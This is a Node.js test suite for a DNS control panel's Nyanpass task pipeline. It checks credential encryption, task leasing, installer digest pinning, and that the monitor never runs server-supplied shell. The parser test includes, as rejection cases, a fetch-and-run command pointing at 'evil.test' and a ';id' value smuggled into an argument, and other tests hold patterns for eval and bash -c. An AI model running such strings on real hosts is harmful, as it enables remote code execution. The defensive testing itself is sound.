import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import test from 'node:test';
import { parseOfficialNyanpassCommand } from '../lib/nyanpass-command.ts';

const taskRoute = await readFile(new URL('../app/api/v1/tasks/route.ts', import.meta.url), 'utf8');
const provisionRoute = await readFile(new URL('../app/api/v1/provision/route.ts', import.meta.url), 'utf8');
const adminRoute = await readFile(new URL('../app/api/admin/nyanpass/route.ts', import.meta.url), 'utf8');
const syncRoute = await readFile(new URL('../app/api/admin/nyanpass/sync/route.ts', import.meta.url), 'utf8');
const monitor = await readFile(new URL('../public/monitor.sh', import.meta.url), 'utf8');
const installScript = await readFile(new URL('../public/install.sh', import.meta.url), 'utf8');
const schema = await readFile(new URL('../db/schema.ts', import.meta.url), 'utf8');
const credential = await readFile(new URL('../lib/nyanpass-credential.ts', import.meta.url), 'utf8');
const panelInstaller = await readFile(new URL('../public/panel-install.sh', import.meta.url), 'utf8');
const proxy = await readFile(new URL('../proxy.ts', import.meta.url), 'utf8');
const lifecycle = await readFile(new URL('../lib/agent-task-lifecycle.ts', import.meta.url), 'utf8');
const readme = await readFile(new URL('../README.md', import.meta.url), 'utf8');

function handler(source, method, nextMethod) {
  const start = source.indexOf(`export async function ${method}`);
  const end = nextMethod ? source.indexOf(`export async function ${nextMethod}`, start) : source.length;
  assert.ok(start >= 0 && end > start, `${method} handler missing`);
  return source.slice(start, end);
}

test('official command parser exposes only the validated structured credential fields', () => {
  const parsed = parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t abcdefgh-1234 -u https://ny.example.test"');
  assert.deepEqual(parsed, { ok: true, args: '-o -t abcdefgh-1234 -u https://ny.example.test', clientToken: 'abcdefgh-1234', panelUrl: 'https://ny.example.test', role: 'outbound' });
  assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://evil.test/x) rel_nodeclient "-t abcdefgh -u https://ny.example.test"').ok, false);
  assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-t abcdefgh -u https://ny.example.test;id"').ok, false);
});

test('credentials are AES-GCM encrypted with task-bound AAD and fail closed without a key', () => {
  assert.match(credential, /AES-GCM/);
  assert.match(credential, /additionalData: aad\(context\)/);
  assert.match(credential, /nodeId.*instanceId.*revision/s);
  assert.match(credential, /PULSEDNS_TASK_ENCRYPTION_KEY/);
  assert.doesNotMatch(schema, /client_token|nyanpass_token|command TEXT/i);
  assert.match(schema, /credentialCiphertext/);
  assert.match(panelInstaller, /generate_task_encryption_key/);
  assert.match(panelInstaller, /chmod 0600 "\$ENV_FILE"/);
  assert.match(panelInstaller, /TASK_KEY_FILE/);
  assert.match(panelInstaller, /rewrite_env_task_encryption_key/);
});

test('admin save encrypts the token and explicit sync queues only a fixed task kind', () => {
  assert.match(adminRoute, /encryptNyanpassCredential\(parsedCommand\.clientToken/);
  assert.doesNotMatch(adminRoute, /installCommand/);
  assert.match(syncRoute, /kind: 'nyanpass_apply_v1'|status: 'queued'/);
  assert.match(syncRoute, /credentialCiphertext/);
  assert.match(syncRoute, /lastTaskPollAt/);
  assert.match(syncRoute, /supportsRemoteSync/);
  assert.match(syncRoute, /export async function DELETE/);
  assert.doesNotMatch(syncRoute, /body\?\.(?:command|args|script|installerUrl|nodeId)/);
});

test('agent task endpoint authenticates, conditionally leases, validates revision, and scrubs the credential on success', () => {
  assert.match(taskRoute, /eq\(nodes\.tokenHash, await sha256\(token\)\)/);
  assert.match(taskRoute, /eq\(agentTasks\.status, 'queued'\)/);
  assert.match(taskRoute, /await db\.batch\(\[/);
  assert.match(taskRoute, /taskWasClaimed/);
  assert.match(taskRoute, /activeTaskId !== task\.id|instance\.activeTaskId !== task\.id/);
  assert.match(taskRoute, /instanceRevision !== task\.revision|instance\.configRevision !== task\.revision/);
  assert.match(taskRoute, /credentialCiphertext: null/);
  assert.match(taskRoute, /task\.status !== 'running' && task\.status !== 'uncertain'/);
  assert.match(taskRoute, /reconcileTerminalInstance/);
  assert.match(taskRoute, /Cache-Control.*no-store/);
  assert.doesNotMatch(taskRoute, /installerUrl|shellCommand|bashCommand/);
  assert.match(proxy, /'\/api\/v1\/tasks'/);
});

test('bootstrap completion is authenticated, durable, and gates remote tasks', () => {
  assert.match(provisionRoute, /tokenHash = await sha256\(token\)/);
  assert.match(provisionRoute, /outcome !== 'succeeded' && outcome !== 'failed'/);
  assert.match(provisionRoute, /body\.protocol !== 1/);
  assert.match(provisionRoute, /provisionAttemptId/);
  assert.match(provisionRoute, /provisionLeaseExpiresAt/);
  assert.match(provisionRoute, /bootstrapGeneration/);
  assert.match(provisionRoute, /eq\(nyanpassInstances\.configRevision, 0\)/);
  assert.match(provisionRoute, /isNull\(nyanpassInstances\.activeTaskId\)/);
  assert.match(taskRoute, /isBootstrapLocked\(provisionState\.status\)/);
  assert.match(provisionRoute, /nyanpass_bootstrap_succeeded/);
  assert.match(provisionRoute, /nyanpass_bootstrap_failed/);
  assert.match(syncRoute, /isBootstrapLocked\(instance\.nodeProvisionStatus/);
  assert.match(monitor, /PROVISION_OUTCOME_DIR/);
  assert.match(monitor, /attemptId/);
  assert.match(monitor, /accepted.*duplicate.*stale/);
  assert.match(monitor, /retry_provision_outcome/);
  assert.match(proxy, /'\/api\/v1\/provision'/);
});

test('node operation lease serializes task delivery, bootstrap callbacks, and deletion-sensitive mutations', () => {
  assert.match(adminRoute, /acquireNodeOperationLock/);
  assert.match(syncRoute, /acquireNodeOperationLock/);
  assert.match(taskRoute, /acquireNodeOperationLock/);
  assert.match(provisionRoute, /acquireNodeOperationLock/);
  for (const source of [adminRoute, syncRoute, taskRoute, provisionRoute]) {
    assert.match(source, /finally \{[\s\S]*releaseNodeOperationLock/);
  }
});

test('task polling expires stale work before recording the new heartbeat', () => {
  const get = handler(taskRoute, 'GET', 'POST');
  const expire = get.indexOf('await expireAgentTasks(db, now, node.id)');
  const heartbeat = get.indexOf('await db.update(nodes).set({ lastTaskPollAt: now');

  assert.ok(expire >= 0, 'GET must expire stale tasks');
  assert.ok(heartbeat > expire, 'the current poll must not refresh lastTaskPollAt before stale-queue evaluation');
});

test('a valid running lease lets the same node accept another queued instance', () => {
  const post = handler(syncRoute, 'POST', 'DELETE');
  const activeLease = post.indexOf('const [activeNodeTask]');
  const staleHeartbeatGuard = post.indexOf('&& !activeNodeTask');

  assert.ok(activeLease >= 0, 'sync POST must look for a running task on the target node');
  assert.match(post.slice(activeLease, staleHeartbeatGuard), /eq\(agentTasks\.nodeId, instance\.nodeId\)[\s\S]*eq\(agentTasks\.status, 'running'\)[\s\S]*gt\(agentTasks\.leaseExpiresAt, requestTime\)/);
  assert.ok(staleHeartbeatGuard > activeLease, 'a running lease must bypass only the stale-heartbeat rejection');
  assert.match(taskRoute, /const \[alreadyRunning\][\s\S]*if \(alreadyRunning\) return idleResponse\(\)/);
});

test('queued-task cancellation uses updatedAt as a compare-and-swap token', () => {
  const cancel = handler(syncRoute, 'DELETE');

  assert.match(cancel, /queuedAt: agentTasks\.updatedAt/);
  assert.match(cancel, /eq\(agentTasks\.status, 'queued'\)[\s\S]*eq\(agentTasks\.updatedAt, queuedTask\.queuedAt\)/);
  assert.match(cancel, /task\?\.status !== 'canceled' \|\| task\.updatedAt\.getTime\(\) !== now\.getTime\(\)/);
});

test('monitor runs a background allowlisted worker and never evaluates server-provided shell', () => {
  assert.match(monitor, /action" != "nyanpass_apply_v1"/);
  assert.match(monitor, /NYANPASS_INSTALL_URL="https:\/\/dl\.nyafw\.com\/download\/nyanpass-install\.sh"/);
  assert.match(monitor, /validate_nyanpass_payload/);
  assert.match(monitor, /jq -e/);
  assert.match(monitor, /flock -n 9/);
  assert.match(installScript, /flock "\$provision_lock_fd"/);
  assert.match(installScript, /TASK_LOCK_FILE="\/run\/ddns-monitor-nyanpass\.lock"/);
  assert.match(monitor, /run_nyanpass_task_loop/);
  assert.match(monitor, /set \+e[\s\S]*\(\s*set -e[\s\S]*worker_status=\$\?/);
  assert.doesNotMatch(monitor, /\) 9>"\$TASK_LOCK_FILE" \|\|/);
  assert.match(monitor, /write_pending_ack "\$job_id" "\$lease_token" failed validation_failed/);
  assert.match(monitor, /write_pending_ack\(\)[\s\S]*valid_ack_payload "\$job_id" "\$lease_token" "\$outcome" "\$error_code" \|\| return 1/);
  assert.match(monitor, /if ! valid_task_uuid "\$job_id" \|\| ! valid_task_lease "\$lease_token"; then[\s\S]*不会写入本地状态/);
  assert.match(monitor, /\^\[0-9a-f\]\{8\}-\[0-9a-f\]\{4\}-4/);
  assert.match(monitor, /timeout --kill-after=30s/);
  assert.match(monitor, /recover_local_task_state/);
  assert.match(monitor, /\.rejected/);
  assert.match(monitor, /outcome="uncertain"/);
  assert.doesNotMatch(monitor, /\beval\b|bash -c|^\s*(?:source|\.)\s+/m);
  assert.doesNotMatch(monitor, /\.job\.(?:command|script|installerUrl|args)/);
});

test('offline tasks converge without unsafe automatic reinstall', () => {
  assert.match(lifecycle, /5 \* 60 \* 1000/);
  assert.match(lifecycle, /agentTasks\.updatedAt/);
  assert.match(lifecycle, /lastTaskPollAt/);
  assert.match(lifecycle, /notExists/);
  assert.match(lifecycle, /eq\(runningTask\.status, 'running'\),\s*gt\(runningTask\.leaseExpiresAt, now\)/);
  assert.match(lifecycle, /status: 'failed'[\s\S]*queue_timeout/);
  assert.match(lifecycle, /status: 'uncertain'[\s\S]*lease_expired/);
  assert.match(lifecycle, /credentialCiphertext: null/);
  assert.doesNotMatch(lifecycle, /leaseTokenHash: null/);
  assert.match(schema, /idx_agent_tasks_one_running_per_node/);
});

test('requeued jobs get a fresh queue time and late acknowledgements accept the original lease', () => {
  assert.match(syncRoute, /createdAt: now,[\s\S]*updatedAt: now/);
  assert.match(taskRoute, /inArray\(agentTasks\.status, \['running', 'uncertain'\]\)/);
  assert.match(taskRoute, /terminalErrorCode = task\.errorCode/);
});

test('probe executables use an HTTPS release plus a pinned digest', () => {
  assert.match(panelInstaller, /SOURCE_LOCK_SHA256/);
  assert.match(monitor, /NYANPASS_INSTALL_URL="https:\/\//);
  assert.match(installScript, /MONITOR_DOWNLOAD_URL="https:\/\/[^"]+"[\s\S]*MONITOR_SHA256="[a-f0-9]{64}"/);
  const pinnedMonitorHash = installScript.match(/MONITOR_SHA256="([a-f0-9]{64})"/)?.[1];
  assert.equal(pinnedMonitorHash, createHash('sha256').update(monitor).digest('hex'));
});

test('self-hosted panels do not serve root shell payloads', () => {
  assert.match(proxy, /const SELF_HOSTED_SCRIPT_PATHS = new Set\(\[[\s\S]*'\/install\.sh'[\s\S]*'\/monitor\.sh'[\s\S]*'\/update\.sh'/);
  assert.match(proxy, /process\.env\.PULSEDNS_SELF_HOSTED !== '1'[\s\S]*return NextResponse\.next\(\)/);
  assert.match(proxy, /SELF_HOSTED_SCRIPT_PATHS\.has\(pathname\)[\s\S]*status: 404/);
  const publicPaths = proxy.match(/const PUBLIC_PATHS = new Set\(\[([\s\S]*?)\]\);/)?.[1] ?? '';
  assert.doesNotMatch(publicPaths, /\/(?:install|monitor|update)\.sh/);
});

test('README uses the pinned HTTPS installer and never recommends an HTTP master script', () => {
  const installerDigest = createHash('sha256').update(installScript).digest('hex');
  assert.match(readme, /curl --proto '=https' --proto-redir '=https'[\s\S]*raw\.githubusercontent\.com\/rosalgee4-lgtm\/pulsedns-control\/release-v0\.8\.0\/public\/install\.sh/);
  assert.ok(readme.includes(installerDigest));
  assert.doesNotMatch(readme, /curl[^\n]*http:\/\/[^\n]*(?:install|monitor|update)\.sh/);
});
